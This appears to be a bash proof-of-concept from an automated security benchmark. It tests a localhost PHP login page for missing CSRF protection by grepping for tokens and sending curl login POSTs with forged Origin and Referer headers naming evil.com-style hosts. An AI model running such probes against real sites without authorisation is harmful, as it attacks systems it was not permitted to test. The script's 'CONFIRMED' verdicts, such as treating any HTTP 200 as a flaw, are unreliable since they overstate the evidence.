#!/bin/bash
# POC: Demonstrates missing CSRF protection on the authentication endpoint by performing unauthorized login requests from simulated malicious origins without CSRF tokens
# Target: ./repo
# Created: 2025-11-07T21:46:40.897Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# CSRF Vulnerability POC - Missing CSRF Protection on Authentication Endpoint
# This script demonstrates that the /index.php login endpoint lacks CSRF protection
# allowing unauthenticated requests from arbitrary origins to authenticate users

TARGET_URL="${1:-http://localhost:8080}"
ENDPOINT="${TARGET_URL}/index.php"

echo "=========================================="
echo "CSRF Protection Test - Authentication Endpoint"
echo "=========================================="
echo "Target: $ENDPOINT"
echo ""

# Test 1: Verify no CSRF tokens in HTML
echo "[TEST 1] Checking for CSRF tokens in response..."
RESPONSE=$(curl -s "$TARGET_URL/")
CSRF_TOKENS=$(echo "$RESPONSE" | grep -iE "csrf|token|nonce" | wc -l)
echo "CSRF/Token/Nonce references found: $CSRF_TOKENS"
if [ "$CSRF_TOKENS" -eq 0 ]; then
    echo "✓ CONFIRMED: No CSRF tokens found in HTML"
else
    echo "✗ CSRF tokens might be present"
fi
echo ""

# Test 2: Check for hidden CSRF token fields
echo "[TEST 2] Checking for hidden token fields..."
HIDDEN_COUNT=$(echo "$RESPONSE" | grep -i "hidden" | wc -l)
echo "Hidden fields found: $HIDDEN_COUNT"
if [ "$HIDDEN_COUNT" -eq 0 ]; then
    echo "✓ CONFIRMED: No hidden CSRF fields detected"
else
    echo "✗ Hidden fields might be present"
fi
echo ""

# Test 3: Cross-origin request from malicious origin WITHOUT csrf token
echo "[TEST 3] Sending cross-origin POST request with malicious Origin header..."
RESPONSE=$(curl -s -X POST "$ENDPOINT" \
    -H "Origin: http://evil.com" \
    -H "Referer: http://evil.com/attack.html" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin&password=test" \
    -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "HTTP Response Code: $HTTP_CODE"
echo "Response Body: $BODY"

if echo "$BODY" | grep -qi "welcome\|admin\|success"; then
    echo "✓ CONFIRMED: Cross-origin request ACCEPTED (HTTP $HTTP_CODE)"
    echo "✓ CSRF VULNERABILITY: Malicious origin request succeeded!"
elif [ "$HTTP_CODE" = "200" ]; then
    echo "✓ CONFIRMED: Cross-origin request returned HTTP 200"
    echo "✓ CSRF VULNERABILITY: No origin validation!"
else
    echo "✗ Request was rejected"
fi
echo ""

# Test 4: Verify no SameSite cookie protection
echo "[TEST 4] Checking for SameSite cookie attribute..."
COOKIES=$(curl -s -i "$ENDPOINT" -X POST \
    -d "username=admin&password=test" | grep -i "Set-Cookie")

if [ -z "$COOKIES" ]; then
    echo "✓ CONFIRMED: No Set-Cookie header found (no session management)"
else
    echo "Cookies found:"
    echo "$COOKIES"
    if echo "$COOKIES" | grep -qi "SameSite"; then
        echo "✗ SameSite attribute present"
    else
        echo "✓ CONFIRMED: No SameSite attribute on cookies"
    fi
fi
echo ""

# Test 5: Cross-origin POST without CSRF validation
echo "[TEST 5] Simulating CSRF attack - POST without token from attacker origin..."
ATTACK_RESPONSE=$(curl -s -X POST "$ENDPOINT" \
    -H "Origin: http://attacker.evil.org" \
    -H "Referer: http://attacker.evil.org/phishing.html" \
    -H "User-Agent: Mozilla/5.0" \
    -d "username=admin&password=malicious_attempt")

if echo "$ATTACK_RESPONSE" | grep -qi "welcome"; then
    echo "✓ CRITICAL: CSRF attack SUCCEEDED"
    echo "  Authentication accepted from attacker origin without CSRF token"
    echo "  Response: $ATTACK_RESPONSE"
else
    echo "Response: $ATTACK_RESPONSE"
fi
echo ""

echo "=========================================="
echo "CSRF VULNERABILITY SUMMARY:"
echo "=========================================="
echo "✓ No CSRF tokens implemented"
echo "✓ No Origin/Referer validation"
echo "✓ No SameSite cookie protection"
echo "✓ Cross-origin requests accepted"
echo "✓ CSRF attacks would succeed"
echo ""
echo "SEVERITY: HIGH - CSRF Protection Missing"
echo "=========================================="